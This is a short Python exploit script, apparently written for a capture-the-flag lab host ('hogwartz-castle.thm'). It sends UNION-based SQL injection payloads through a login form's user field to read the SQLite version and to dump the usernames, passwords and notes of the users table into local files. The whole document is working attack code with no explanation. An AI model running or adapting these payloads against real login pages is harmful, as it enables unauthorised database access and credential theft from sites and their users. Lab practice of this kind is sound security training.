import requests

host = "http://hogwartz-castle.thm/login"

print ('[-] Printing SQLite version...')
res = requests.post(host, data={"user":"admin' union select (select sqlite_version()),2,3,4 -- - ", "password":"dummy"})
sqlite_version = res.text.split(" ")[3]
print ("[-] SQLite ", sqlite_version)

print ("[-] Dumping 'name' column from users db...")
res = requests.post(host, data={"user":"admin' union select (select group_concat(name,'~~') from users),2,3,4 -- - ", "password":"dummy"})
name_dump = " ".join(res.text.split(" ")[3:44]).replace("~~", "\n")
print (name_dump)
with open('name.dump','w') as nd:
    nd.write(name_dump)

print ("[-] Dumping 'password' column from users db...")
res = requests.post(host, data={"user":"admin' union select (select group_concat(password,'~~') from users),2,3,4 -- - ", "password":"dummy"})
pwd_dump = " ".join(res.text.split(" ")[3:len(res.text.split(" ")) - 3]).replace("~~", "\n")
print (pwd_dump)
with open('pwd.dump','w') as pd:
    pd.write(pwd_dump)

print ("[-] Dumping 'notes' column from users db...")
res = requests.post(host, data={"user":"admin' union select (select group_concat(notes,'~~') from users),2,3,4 -- - ", "password":"dummy"})
notes_dump = " ".join(res.text.split(" ")[3:len(res.text.split(" ")) - 3]).replace("~~", "\n")
print (notes_dump)
with open('notes.dump','w') as nod:
    nod.write(notes_dump)

